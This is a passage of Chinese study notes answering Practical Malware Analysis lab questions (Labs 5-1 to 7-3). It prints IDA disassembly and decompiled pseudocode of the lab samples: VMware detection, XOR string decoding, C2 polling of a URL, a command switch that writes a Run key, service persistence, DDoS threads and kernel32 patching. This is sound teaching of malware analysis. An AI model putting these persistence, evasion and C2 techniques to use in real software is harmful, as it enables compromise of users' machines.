(opcode 0xED). This instruction is used with a magic string VMXh to perform VMware detection. Is that in use in this malware? Using the cross-references to the function that executes the in instruction, is there further evidence of VMware detection?\n 按 alt+B 之后输入指令 in 的 opcode 0xED 可以在搜索结果中找到一个 in 指令：\n.text:100061DB\tsub_10006196\tin eax, dx\r我们查看这个调用位置的伪代码：\nchar sub_10006196()\r{\runsigned __int32 v0; // eax\rv0 = __indword(0x5658u);\rreturn 0;\r}\r通过 cross refrence 查看这个函数的被调用位置，发现有三处被调用，我们查看其中第一个的伪代码：\nif ( atoi(off_10019034[0] + 13) \u0026amp;\u0026amp; ((unsigned __int8)sub_10006119() || sub_10006196()) )\r{\rsub_10003592(unk_1008E5F0, v7);\rsub_10003592(aFoundVirtualMa, v4);\rresult = sub_10005567(Format);\r}\r如果这个函数 sub_10006196() 调用了返回为真，则会调用：Found Virtual Machine,Install Cancel. 这个字符串，可见这个函数就是用于检测是否为虚拟机的函数。\nQUESTION 18 #   Jump your cursor to 0x1001D988. What do you find?\n 一个存储着看起来很随机的字符串：\n.data:1001D988 a1UUU7461Yu2u10 db '-1::',27h,'u\u0026lt;\u0026amp;u!=\u0026lt;\u0026amp;u746\u0026gt;1::',27h,'yu\u0026amp;!',27h,'\u0026lt;;2u106:101u3:',27h,'u'\rQUESTION 19 #   If you have the IDA Python plug-in installed (included with the commercial version of IDA Pro), run Lab05-01.py, an IDA Pro Python script provided with the malware for this book. (Make sure the cursor is at 0x1001D988.) What happens after you run the script?\n 在 File--\u0026gt;Script 中选择 Lab05-01.py 这个文件：\n.data:1001D988 a1UUU7461Yu2u10 db 'xdoor is this backdoor, string decoded for '\r可以看到 0x1001D988 这个地址的内容发生了变化。\nQUESTION 20 #   With the cursor in the same location, how do you turn this data into a single ASCII string?\n 按下键盘上的 A。\nQUESTION 21 #   Open the script with a text editor. How does it work?\n 打开：\nsea = ScreenEA() for i in range(0x00,0x50): b = Byte(sea+i) decoded_byte = b ^ 0x55 PatchByte(sea+i,decoded_byte) ScreenEA() 函数获取了光标所在的位置，PatchByte() 函数用于写入一个字节。\n这个 python 脚本的作用是将光标之后的 0x50 个字节的内容与 0x55 做异或操作，并写入原来的位置。\n"},{"id":136,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-1/","title":"Lab6 1","section":"06","content":"lab 6-1 #  QUESTION 1 #   What is the major code construct found in the only subroutine called by main?\n 在左侧的函数列表中选择 _main ，然后在右侧可以看到 _main 函数的汇编代码：\n.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)\r.text:00401040 _main proc near ; CODE XREF: start+AF\u0019p\r.text:00401040\r.text:00401040 var_4 = dword ptr -4\r.text:00401040 argc = dword ptr 8\r.text:00401040 argv = dword ptr 0Ch\r.text:00401040 envp = dword ptr 10h\r.text:00401040\r.text:00401040 push ebp\r.text:00401041 mov ebp, esp\r.text:00401043 push ecx\r.text:00401044 call sub_401000\r.text:00401049 mov [ebp+var_4], eax\r.text:0040104C cmp [ebp+var_4], 0\r.text:00401050 jnz short loc_401056\r.text:00401052 xor eax, eax\r.text:00401054 jmp short loc_40105B\r.text:00401056 ; ---------------------------------------------------------------------------\r.text:00401056\r.text:00401056 loc_401056: ; CODE XREF: _main+10\u0018j\r.text:00401056 mov eax, 1\r.text:0040105B\r.text:0040105B loc_40105B: ; CODE XREF: _main+14\u0018j\r.text:0040105B mov esp, ebp\r.text:0040105D pop ebp\r.text:0040105E retn\r.text:0040105E _main endp\r我们发现 main 函数调用的唯一子过程是在 .text:00401044 这个位置的调用 sub_401000 这个函数，我们查看这个函数的伪代码：\n.text:00401000 ; =============== S U B R O U T I N E =======================================\r.text:00401000\r.text:00401000 ; Attributes: bp-based frame\r.text:00401000\r.text:00401000 sub_401000 proc near ; CODE XREF: _main+4\u0019p\r.text:00401000\r.text:00401000 var_4 = dword ptr -4\r.text:00401000\r.text:00401000 push ebp\r.text:00401001 mov ebp, esp\r.text:00401003 push ecx\r.text:00401004 push 0 ; dwReserved\r.text:00401006 push 0 ; lpdwFlags\r.text:00401008 call ds:InternetGetConnectedState\r.text:0040100E mov [ebp+var_4], eax\r.text:00401011 cmp [ebp+var_4], 0\r.text:00401015 jz short loc_40102B\r.text:00401017 push offset aSuccessInterne ; \u0026quot;Success: Internet Connection\\n\u0026quot;\r.text:0040101C call sub_40105F\r.text:00401021 add esp, 4\r.text:00401024 mov eax, 1\r.text:00401029 jmp short loc_40103A\r.text:0040102B ; ---------------------------------------------------------------------------\r.text:0040102B\r.text:0040102B loc_40102B: ; CODE XREF: sub_401000+15\u0018j\r.text:0040102B push offset aError1_1NoInte ; \u0026quot;Error 1.1: No Internet\\n\u0026quot;\r.text:00401030 call sub_40105F\r.text:00401035 add esp, 4\r.text:00401038 xor eax, eax\r.text:0040103A\r.text:0040103A loc_40103A: ; CODE XREF: sub_401000+29\u0018j\r.text:0040103A mov esp, ebp\r.text:0040103C pop ebp\r.text:0040103D retn\r.text:0040103D sub_401000 endp\r主要的代码结构是 .text:00401011 与 .text:00401015 这两行构成的 if 语句的汇编代码。按空格键查看 cfg 更加直观。\nQUESTION 2 #   What is the subroutine located at 0x40105F?\n 0x40105F 是一个子过程的入口地址，也是在第一问中得到的 main 函数调用唯一子过程中，如果 InternateGetConnectedState 函数的返回值如果不为 0 的调用函数，可以看到其伪代码为：\nint __cdecl sub_40105F(int a1, int a2)\r{\rint v2; // edi@1\rint v3; // ebx@1\rv2 = _stbuf(\u0026amp;stru_407098);\rv3 = sub_401282(\u0026amp;stru_407098, a1, (int)\u0026amp;a2);\r_ftbuf(v2, \u0026amp;stru_407098);\rreturn v3;\r}\r其中，定义在 stru_407098 的结构是文件：\n.data:00407098 ; FILE stru_407098\r.data:00407098 stru_407098 FILE \u0026lt;0, 0, 0, 2, 1, 0, 0, 0\u0026gt; ; DATA XREF: sub_40105F+2\u0018o\r.data:00407098 ; __stbuf+12\u0018o ...\r函数 sub_401282 是一个很长的函数。\n我们尝试寻找调用 sub_40105F 这个函数的位置传入的参数是什么，我们发现传入的是 Success: Internet Connection 与 Error 1.1: No Internet 这两个字符串的地址，\nQUESTION 3 #   What is the purpose of this program?\n 因为 sub_401282 这个程序的结构过于复杂不予研究的话，根据函数行为判断，这个程序仅仅通过 InternateGetConnectedState() 这个函数检测是否有有网络连接。\n"},{"id":137,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-2/","title":"Lab6 2","section":"06","content":"lab 6-2 #  QUESTION 1 #   What operation does the first subroutine called by main perform?\n 查看 _main 的汇编代码：\n.text:00401130 ; =============== S U B R O U T I N E =======================================\r.text:00401130\r.text:00401130 ; Attributes: bp-based frame\r.text:00401130\r.text:00401130 ; int __cdecl main(int argc, const char **argv, const char **envp)\r.text:00401130 _main proc near ; CODE XREF: start+AF\u0019p\r.text:00401130\r.text:00401130 var_8 = byte ptr -8\r.text:00401130 var_4 = dword ptr -4\r.text:00401130 argc = dword ptr 8\r.text:00401130 argv = dword ptr 0Ch\r.text:00401130 envp = dword ptr 10h\r.text:00401130\r.text:00401130 push ebp\r.text:00401131 mov ebp, esp\r.text:00401133 sub esp, 8\r.text:00401136 call sub_401000\r......\r可见这个汇编代码调用的第一个子过程是 sub_401000，同样的查看它的伪代码：\nsigned int sub_401000()\r{\rsigned int result; // eax@2\rif ( InternetGetConnectedState(0, 0) )\r{\rsub_40117F(aSuccessInterne);\rresult = 1;\r}\relse\r{\rsub_40117F(aError1_1NoInte);\rresult = 0;\r}\rreturn result;\r}\r这也是一个判断网络连接状态的函数。\nQUESTION 2 #   What is the subroutine located at 0x40117F?\n 跳转到这个地址之后查看这个子过程的伪代码：\nint sub_40117F(const char *a1, ...) { int v1; // edi@1  int v2; // ebx@1  va_list va; // [sp+14h] [bp+8h]@1  va_start(va, a1); v1 = _stbuf(\u0026amp;stru_407160); v2 = sub_4013A2(\u0026amp;stru_407160, (int)a1, (int)va); _ftbuf(v1, \u0026amp;stru_407160); return v2; } 这个跟前面一题的 printf 内容是类似的。应该也是一个 printf 函数。\nQUESTION 3 #   What does the second subroutine called by main do?\n 先找到 main 函数的调用的第二个子过程，是在 .text:401148 位置调用的函数 sub_401040。\nchar sub_401040() { char result; // al@2  char Buffer; // [sp+0h] [bp-210h]@3  char v2; // [sp+1h] [bp-20Fh]@6  char v3; // [sp+2h] [bp-20Eh]@7  char v4; // [sp+3h] [bp-20Dh]@8  char v5; // [sp+4h] [bp-20Ch]@9  HINTERNET hFile; // [sp+200h] [bp-10h]@1  HINTERNET hInternet; // [sp+204h] [bp-Ch]@1  DWORD dwNumberOfBytesRead; // [sp+208h] [bp-8h]@3  int v9; // [sp+20Ch] [bp-4h]@3  hInternet = InternetOpenA(szAgent, 0, 0, 0, 0); hFile = InternetOpenUrlA(hInternet, szUrl, 0, 0, 0, 0); if ( hFile ) { v9 = InternetReadFile(hFile, \u0026amp;Buffer, 0x200u, \u0026amp;dwNumberOfBytesRead); if ( v9 ) { if ( Buffer != 60 || v2 != 33 || v3 != 45 || v4 != 45 ) { sub_40117F(aError2_3FailTo); result = 0; } else { result = v5; } } else { sub_40117F(aError2_2FailTo); InternetCloseHandle(hInternet); InternetCloseHandle(hFile); result = 0; } } else { sub_40117F(aError2_1FailTo); InternetCloseHandle(hInternet); result = 0; } return result; } 我们逐个分析，对于：\nhInternet = InternetOpenA(szAgent, 0, 0, 0, 0); // szAgent ==\u0026gt; 字符常量 Internet Explorer 7.5/pma 这一行代码通过 Internet Explorer 7.5 打开了一个浏览器。\n对于：\nhFile = InternetOpenUrlA(hInternet, szUrl, 0, 0, 0, 0); // szUrl ==\u0026gt; 字符常量 http://www.practicalmalwareanalysis.com/cc.htm 这一行代码在之前打开的浏览器中打开了一个链接 http://www.practicalmalwareanalysis.com/cc.htm。\n对于：\nv9 = InternetReadFile(hFile, \u0026amp;Buffer, 0x200u, \u0026amp;dwNumberOfBytesRead); 这一行代码将打开的网页读入变量中。\n对于：\nsub_40117F(aError2_3FailTo); // aError2_3FailTo ==\u0026gt; 字符常量 Error 2.3: Fail to get command ...... sub_40117F(aError2_2FailTo); // aError2_3FailTo ==\u0026gt; 字符常量 Error 2.2: Fail to ReadFile ...... sub_40117F(aError2_1FailTo); // aError2_1FailTo ==\u0026gt; 字符常量 Error 2.1: Fail to OpenUrl 都是用于抛出异常、错误的函数。\n结论：综上所述，这个函数用于读取 http://www.practicalmalwareanalysis.com/cc.htm 的内容，并且将其作为函数的返回结果返回。读取失败会抛出异常。\nQUESTION 4 #   What type of code construct is used in this subroutine?\n 主要是 if 语句。\nQUESTION 5 #   Are there any network-based indicators for this program?\n 有。主要有以下三点：\n 静态分析这个应用程序引用的动态链接库，有调用网络相关的 API 函数； 动态分析这个应用程序，运行这个应用程序将检测到 DNS 请求。 这个应用应用程序的全局变量（字符串）区有 http://www.practicalmalwareanalysis.com/cc.htm 这样的字符串。  QUESTION 6 #   What is the purpose of this malware?\n 我们尝试把网页尝试下载的内容下载下来：\n$ wget http://www.practicalmalwareanalysis.com/cc.htm --2019-06-05 15:00:49-- http://www.practicalmalwareanalysis.com/cc.htm Resolving www.practicalmalwareanalysis.com (www.practicalmalwareanalysis.com)... 192.0.78.24, 192.0.78.25 Connecting to www.practicalmalwareanalysis.com (www.practicalmalwareanalysis.com)|192.0.78.24|:80... connected. HTTP request sent, awaiting response... 301 Moved Permanently Location: https://www.practicalmalwareanalysis.com/cc.htm [following] --2019-06-05 15:00:50-- https://www.practicalmalwareanalysis.com/cc.htm Connecting to www.practicalmalwareanalysis.com (www.practicalmalwareanalysis.com)|192.0.78.24|:443... connected. 一直卡在了这个位置。我们直接用 Chrome 访问发现出现了 404 错误。\n暂时不清楚这个恶意代码的作用。\n"},{"id":138,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-3/","title":"Lab6 3","section":"06","content":"lab 6-3 #  QUESTION 1 #   Compare the calls in main to Lab 6-2’s main method. What is the new function called from main?\n 后面多出了 sub_401130 这个函数。\nQUESTION 2 #   What parameters does this new function take?\n Ida Pro 将函数声明生成了以下的伪代码：\nint __cdecl sub_401130(char, LPCSTR lpExistingFileName) 其传入的参数是一个字符型的变量，一个指向文件名的字符指针。\nQUESTION 3 #   What major code construct does this function contain?\n 主要是一个 switch case 语句：\nvoid __cdecl sub_401130(char a1, LPCSTR lpExistingFileName) { HKEY phkResult; // [sp+4h] [bp-4h]@5  switch ( a1 ) { case 97: CreateDirectoryA(PathName, 0); break; case 98: CopyFileA(lpExistingFileName, (LPCSTR)Data, 1); break; case 99: DeleteFileA((LPCSTR)Data); break; case 100: RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, 0xF003Fu, \u0026amp;phkResult); if ( RegSetValueExA(phkResult, ValueName, 0, 1u, Data, 0xFu) ) sub_401271(aError3_1CouldN); break; case 101: Sleep(0x186A0u); break; default: sub_401271(aError3_2NotAVa); break; } } QUESTION 4 #   What can this function do?\n 观察上面的伪代码容易的到这个函数的逻辑：\n   传入的第一个字符参数 执行的动作     chr(97) = a 创建文件夹 PathName = C:\\Temp   chr(98) = b 复制文件 lpExistingFileName（传入的参数）到 Data = C:\\Temp\\cc.exe   chr(99) = c 删除文件 Data = C:\\Temp\\cc.exe   chr(100) = d 打开注册表项 Software\\Microsoft\\Windows\\CurrentVersion\\Run，\n并且将其值设置为 ValueName = Malware   chr(101) = e 睡眠 0x186A0 = 100 000ms = 100s   默认 报错 Error 3.2: Not a valid command provided    QUESTION 5 #   Are there any host-based indicators for this malware?\n 一个注册表的更改和一个文件的创建 C:\\Temp\\cc.exe。\nQUESTION 6 #   What is the purpose of this malware?\n 这个程序的大致内容与之前的一个程序内容类似。另外，他添加了了的函数（之前分析的带 switch case 语句的函数），增加了删除的功能。\n"},{"id":139,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/06/lab6-4/","title":"Lab6 4","section":"06","content":"lab 6-4 #  QUESTION 1 #   What is the difference between the calls made from the main method in Labs 6-3 and 6-4?\n 分别考虑下面的函数：\n sub_401000：这个函数在两个 lab 中是相同的，都是用于检测网络的连通性； sub_401040：也是相同的，下载网页的文件然后解析其中的内容； sub_401050：就是在 lab3 中的 sub_401130 这个函数，通过传入一个字符执行不同的命令； sub_4012B5：在 lab2 中分析的可能是 printf 的函数。  QUESTION 2 #   What new code construct has been added to main?\n 在检测了网络的连通性之后，添加了一个 for 循环。其代码结构是 cmp 和 jge 组成的：\nloc_40125A:\rcmp [ebp+var_C], 5A0h\rjge short loc_4012AF\r另外还在 for 循环结束添加了 sleep 函数：\npush 0EA60h ; dwMilliseconds\rcall ds:Sleep\rQUESTION 3 #   What is the difference between this lab’s parse HTML function and those of the previous labs?\n 在第一问中分析过了，解析的函数是 sub_401040，我们查看它的伪代码：\nchar __cdecl sub_401040(int a1) { char result; // al@2  int Buffer; // [sp+0h] [bp-230h]@3  char v3; // [sp+4h] [bp-22Ch]@9  HINTERNET hFile; // [sp+200h] [bp-30h]@1  HINTERNET hInternet; // [sp+204h] [bp-2Ch]@1  CHAR szAgent; // [sp+208h] [bp-28h]@1  DWORD dwNumberOfBytesRead; // [sp+228h] [bp-8h]@3  int v8; // [sp+22Ch] [bp-4h]@3  sprintf(\u0026amp;szAgent, aInternetExplor, a1); hInternet = InternetOpenA(\u0026amp;szAgent, 0, 0, 0, 0); hFile = InternetOpenUrlA(hInternet, szUrl, 0, 0, 0, 0); if ( hFile ) { v8 = InternetReadFile(hFile, \u0026amp;Buffer, 0x200u, \u0026amp;dwNumberOfBytesRead); if ( v8 ) { if ( (char)Buffer != 60 || SBYTE1(Buffer) != 33 || SBYTE2(Buffer) != 45 || SBYTE3(Buffer) != 45 ) { sub_4012B5(aError2_3FailTo); result = 0; } else { result = v3; } } else { sub_4012B5(aError2_2FailTo); InternetCloseHandle(hInternet); InternetCloseHandle(hFile); result = 0; } } else { sub_4012B5(aError2_1FailTo); InternetCloseHandle(hInternet); result = 0; } return result; } 主要的区别是在函数 InternetOpenA() 这个函数之前添加了这样的一行代码：\nsprintf(\u0026amp;szAgent, aInternetExplor, a1); 这一行的代码的作用是拼接字符串 aInternetExplor 与 a1 并且将结果赋值给 szAgent。\nQUESTION 4 #   How long will this program run? (Assume that it is connected to the Internet.)\n for 循环的次数：（0x5A0 = 1440）\n.text:0040125A cmp [ebp+var_C], 5A0h\r如果不考虑各种子函数的执行时间，仅考虑在 _main 中执行的 sleep 函数的时间占用。每次睡眠的时间为：\npush 0EA60h ; dwMilliseconds\rcall ds:Sleep\r所以总的程序运行时间为 0xEA60 ms * 1440 = 60000 ms * 1440 = 1 min * 1440 = 24 h\n所以如果不考虑网络的链接状况和各种子函数的调用次数，这个程序大约会运行一天。\nQUESTION 5 #   Are there any new network-based indicators for this malware?\n 每次使用的浏览器客户端都不同（在第三问中分析过）。\nQUESTION 6 #   What is the purpose of this malware?\n 先检查 Internet 连接，使用随时间可变的 user-agent 下载网页，解析HTML，程序运行 24h 终止。\n"},{"id":140,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-1/","title":"Lab7 1","section":"07","content":"lab 7-1 #  QUESTION 1 #   How does this program ensure that it continues running (achieves persistence) when the computer is restarted?\n 我们先分析这个程序的结构，查看 _main 函数的伪代码：\nint __cdecl main(int argc, const char **argv, const char **envp) { SERVICE_TABLE_ENTRYA ServiceStartTable; // [sp+0h] [bp-10h]@1  int v5; // [sp+8h] [bp-8h]@1  int v6; // [sp+Ch] [bp-4h]@1  ServiceStartTable.lpServiceName = aMalservice; ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)sub_401040; v5 = 0; v6 = 0; StartServiceCtrlDispatcherA(\u0026amp;ServiceStartTable); return sub_401040(0, 0, ServiceStartTable.lpServiceName, ServiceStartTable.lpServiceProc, v5, v6); } 其中创建了一个 SERVICE_TABLE_ENTRYA 类型的变量，将 sub_401040 这个函数赋值给 lpServerceProc 这个子变量，并通过调用 StartServiceCtrlDispatcherA 这个函数注册这个服务。\n并且通过 sub_401040(0, 0, ServiceStartTable.lpServiceName, ServiceStartTable.lpServiceProc, v5, v6) 的方式调用了这个函数，所以我们进一步分析这个关键的函数 sub_401040()：\nint sub_401040() { SC_HANDLE v0; // esi@3  HANDLE v1; // esi@3  signed int v2; // esi@4  SYSTEMTIME SystemTime; // [sp+0h] [bp-400h]@3  struct _FILETIME FileTime; // [sp+10h] [bp-3F0h]@3  CHAR Filename; // [sp+18h] [bp-3E8h]@3  if ( OpenMutexA(0x1F0001u, 0, Name) ) ExitProcess(0); CreateMutexA(0, 0, Name); v0 = OpenSCManagerA(0, 0, 3u); GetCurrentProcess(); GetModuleFileNameA(0, \u0026amp;Filename, 0x3E8u); CreateServiceA(v0, DisplayName, DisplayName, 2u, 0x10u, 2u, 0, \u0026amp;Filename, 0, 0, 0, 0, 0); *(_DWORD *)\u0026amp;SystemTime.wYear = 0; *(_DWORD *)\u0026amp;SystemTime.wDayOfWeek = 0; *(_DWORD *)\u0026amp;SystemTime.wHour = 0; *(_DWORD *)\u0026amp;SystemTime.wSecond = 0; SystemTime.wYear = 2100; SystemTimeToFileTime(\u0026amp;SystemTime, \u0026amp;FileTime); v1 = CreateWaitableTimerA(0, 0, 0); SetWaitableTimer(v1, (const LARGE_INTEGER *)\u0026amp;FileTime, 0, 0, 0, 0); if ( !WaitForSingleObject(v1, 0xFFFFFFFF) ) { v2 = 20; do { CreateThread(0, 0, StartAddress, 0, 0, 0); --v2; } while ( v2 ); } Sleep(0xFFFFFFFF); return 0; } 我们发现其中的一个关键的函数 CreateServiceA(v0, DisplayName, DisplayName, 2u, 0x10u, 2u, 0, \u0026amp;Filename, 0, 0, 0, 0, 0);，这个函数用于创建了一个服务，我们查看这个函数的原型：\nSC_HANDLE __stdcall CreateServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword); 这个函数的第六个参数，调用时传入的参数是 2u，可以在 MSDN 中查找到具体的各个参数的含义：\n   Value Meaning     SERVICE_AUTO_START 0x00000002 A service started automatically by the service control manager during system startup. For more information, see Automatically Starting Services.   SERVICE_BOOT_START 0x00000000 A device driver started by the system loader. This value is valid only for driver services.   SERVICE_DEMAND_START 0x00000003 A service started by the service control manager when a process calls the StartService function. For more information, see Starting Services on Demand.   SERVICE_DISABLED 0x00000004 A service that cannot be started. Attempts to start the service result in the error code ERROR_SERVICE_DISABLED.   SERVICE_SYSTEM_START 0x00000001 A device driver started by the IoInitSystem function. This value is valid only for driver services.    所以这个程序通过创建一个服务，并且将其第六个参数 DWORD dwServiceType 设置为 SERVICE_AUTO_START 0x02 来设置程序的自启动。\nQUESTION 2 #   Why does this program use a mutex?\n 在上面的伪代码分析中，我们发现程序在执行 sub_401040() 这个函数之前首先使用 CreateMutexA(0, 0, Name); 这个函数创建了一个互斥量。如果通过 OpenMutexA(0x1F0001u, 0, Name) 这个方法检测到互斥量的存在，则程序直接退出。\n其目的应该是确保后面对进程、系统时间、文件或者服务的访问，只有一个进程在使用。\nQUESTION 3 #   What is a good host-based signature to use for detecting this program?\n 根据第一问对伪代码的分析我们可以得到：\n  被这个程序感染的机器会创建一个服务，其名称为 DisplayName = Malservice\n  被这个感染的机器，如果程序正在运行，则会创建一个互斥量 Name = HGL345\n  QUESTION 4 #   What is a good network-based signature for detecting this malware?\n 我们进一步分析伪代码，发现这个程序通过 do while 循环创建线程执行以下的函数 20 次：\nCreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0); 于是我们查看 StartAddress 中的函数伪代码：\nvoid __stdcall __noreturn StartAddress(LPVOID lpThreadParameter) { void *i; // esi@1  for ( i = InternetOpenA(szAgent, 1u, 0, 0, 0); ; InternetOpenUrlA(i, szUrl, 0, 0, 0x80000000, 0) ) ; } 其中：\n 字符串 szAgent = Internet Explorer 8.0 字符串 szUrl = http://www.malwareanalysisbook.com  这个函数的功能是打开一个浏览器 Internet Explorer 8.0，并且不断地在这个浏览器中打开网址 http://www.malwareanalysisbook.com。\nQUESTION 5 #   What is the purpose of this program?\n 我们进一步分析函数 sub_401040 的逻辑，发现在 do while 循环之前 SystemTime 的值被设置为了 2100 年 1 月 1 日 00:00，结合我们在第四问中分析的逻辑。\n我们知道这个程序的目的是在 2100 年 1 月 1 日 00:00 这个时间打开 20 个线程不断打开网页 http://www.malwareanalysisbook.com。猜测其目的是在这个时间点联合多台感染主机对目标发起 DDoS 攻击。\nQUESTION 6 #   When will this program finish executing?\n 根据之前的分析，程序创建了 20 个不会停止的线程之后会 Sleep(0xFFFFFFFF);，这是一个 unsigned int 类型的最大值，以毫秒为单位计算之后这个程序 sleep 的时间，得到 49 天  的结果。\n所以这个程序的主控线程会在执行了 49 天之后停止，但是很显然这个恶意代码的作者并不想让他停止，之所以为 49 天只是因为并不能休眠更长的时间了。\n"},{"id":141,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-2/","title":"Lab7 2","section":"07","content":"lab 7-2 #  QUESTION 1 #   How does this program achieve persistence?\n 我们同样的通过 _main 函数开始分析：\nint __cdecl main(int argc, const char **argv, const char **envp) { OLECHAR *v3; // esi@3  LPVOID ppv; // [sp+0h] [bp-24h]@2  VARIANTARG pvarg; // [sp+4h] [bp-20h]@3  __int16 v7; // [sp+14h] [bp-10h]@3  int v8; // [sp+1Ch] [bp-8h]@3  if ( OleInitialize(0) \u0026gt;= 0 ) { CoCreateInstance(\u0026amp;rclsid, 0, 4u, \u0026amp;riid, \u0026amp;ppv); if ( ppv ) { VariantInit(\u0026amp;pvarg); v7 = 3; v8 = 1; v3 = SysAllocString(psz); (*(void (__stdcall **)(LPVOID, OLECHAR *, __int16 *, VARIANTARG *, VARIANTARG *, VARIANTARG *))(*(_DWORD *)ppv + 44))( ppv, v3, \u0026amp;v7, \u0026amp;pvarg, \u0026amp;pvarg, \u0026amp;pvarg); SysFreeString(v3); } OleUninitialize(); } return 0; } 查看被调用的所有函数，这个程序似乎并没有尝试永久地运行。\nQUESTION 2 #   What is the purpose of this program?\n 根据之前对 main 函数的分析，这个程序的作用是仅仅是打开 http://www.malwareanalysisbook.com/ad.html\nQUESTION 3 #   When will this program finish executing?\n 并没有任何延时函数，直接退出。\n"},{"id":142,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/07/lab7-3/","title":"Lab7 3","section":"07","content":"lab 7-3 #  QUESTION 1 #   How does this program achieve persistence to ensure that it continues running when the computer is restarted?\n 首先查看函数导入表，发现 Lab07-03.exe 这个文件有导入一个 CopyFileA 这个敏感函数。\n然后我们分析这个可执行文件的伪代码。伪代码定义了大量局部变量后，先进行如下的判断：\nif ( argc == 2 \u0026amp;\u0026amp; !strcmp(argv[1], aWarning_this_w) ) 该判断的作用是判断命令行参数长度是否为 2，第二个参数内容是否为 WARNING_THIS_WILL_DESTROY_YOUR_MACHINE。\n以下几行的伪代码，通过查看 MSDN 的 API 函数介绍可以阅读其功能：\nv3 = CreateFileA(FileName, 0x80000000, 1u, 0, 3u, 0, 0); hObject = v3; v4 = CreateFileMappingA(v3, 0, 2u, 0, 0, 0); v5 = (char *)MapViewOfFile(v4, 4u, 0, 0, 0); v6 = v5; argca = (int)v5; v7 = CreateFileA(ExistingFileName, 0x10000000u, 1u, 0, 3u, 0, 0); v50 = v7; if ( v7 == (HANDLE)-1 ) exit(0); v8 = CreateFileMappingA(v7, 0, 4u, 0, 0, 0); if ( v8 == (HANDLE)-1 ) exit(0); v9 = (const char **)MapViewOfFile(v8, 0xF001Fu, 0, 0, 0); argva = v9; if ( !v9 ) exit(0); 其功能大概是创建一个文件 FileName = C:\\Windows\\System32\\Kernel32.dll，并且将其内容映射到内存中作为一个字符型的指针 v5 存储。并且打开了文件 ExistingFileName = Lab07-03.dll，并将其映射到了变量 v9\n后面一段直到主函数结束，多次调用 sub_401040()、sub_401070()、sub_4010A0() 这些函数，这个函数内部又调用了 sub_401000 这个函数，我们暂时不分析这段比较长的片段代码。\n在函数结束时，调用了 sub_4011E0(aC, 0); 这个函数，我们进一步分析这个函数。伪代码大致如下：\nresult = a2; if ( a2 \u0026lt;= 7 ) { v3 = lpFileName; v4 = FindFirstFileA(lpFileName, \u0026amp;FindFileData); hFindFile = v4; while ( v4 != (HANDLE)-1 ) { if ( !(FindFileData.dwFileAttributes \u0026amp; 0x10) || !strcmp(FindFileData.cFileName, a_) || !strcmp(FindFileData.cFileName, a__) ) { v6 = strlen(FindFileData.cFileName) + 1; v7 = (char *)malloc(strlen(v3) + strlen(FindFileData.cFileName) + 1); strcpy(v7, lpFileName); v7[strlen(lpFileName) - 1] = 0; strcat(v7, FindFileData.cFileName); if ( !stricmp((const char *)\u0026amp;FindFileData.dwReserved0 + v6 + 3, a_exe) ) sub_4010A0(v7); v3 = lpFileName; } else { v5 = (char *)malloc(strlen(v3) + 2 * strlen(FindFileData.cFileName) + 6); strcpy(v5, v3); v5[strlen(v3) - 1] = 0; strcat(v5, FindFileData.cFileName); strcat(v5, asc_403038); sub_4011E0(v5, a2 + 1); } v4 = hFindFile; result = FindNextFileA(hFindFile, \u0026amp;FindFileData); if ( !result ) return result; } result = FindClose((HANDLE)0xFFFFFFFF); } return result; 没有看到特别有特征的 API 函数，我们转到汇编代码，并且查看 xref from...，查看它调用的所有函数：\n值得注意的是，这个函数进行了自调用，其中一个比较重要的子函数是 sub_4010A0 我们进一步分析这个函数。同样的用 F5 查看其伪代码：\n... v1 = CreateFileA(lpFileName, 0x10000000u, 1u, 0, 3u, 0, 0); v14 = v1; v2 = CreateFileMappingA(v1, 0, 4u, 0, 0, 0); hObject = v2; result = MapViewOfFile(v2, 0xF001Fu, 0, 0, 0); v4 = result; v12 = result; if ( result ) { v5 = (int)result + *((_DWORD *)result + 15); result = (const void *)IsBadReadPtr((char *)result + *((_DWORD *)result + 15), 4u); if ( !result \u0026amp;\u0026amp; *(_DWORD *)v5 == 17744 ) { v6 = (const void *)sub_401040(*(_DWORD *)(v5 + 128), v5, (int)v4); v7 = v6; result = (const void *)IsBadReadPtr(v6, 0x14u); if ( !result ) { for ( i = (int *)((char *)v7 + 12); *(i - 2) || *i; i += 5 ) { v9 = (int *)sub_401040(*i, v5, (int)v4); v10 = v9; result = (const void *)IsBadReadPtr(v9, 0x14u); if ( result ) return result; if ( !stricmp((const char *)v10, Str2) ) { qmemcpy(v10, \u0026amp;dword_403010, strlen((const char *)v10) + 1); v4 = v12; } } v11 = v5 + 208; *(_DWORD *)v11 = 0; *(_DWORD *)(v11 + 4) = 0; UnmapViewOfFile(v4); CloseHandle(hObject); result = (const void *)CloseHandle(v14); } } } return result; ... 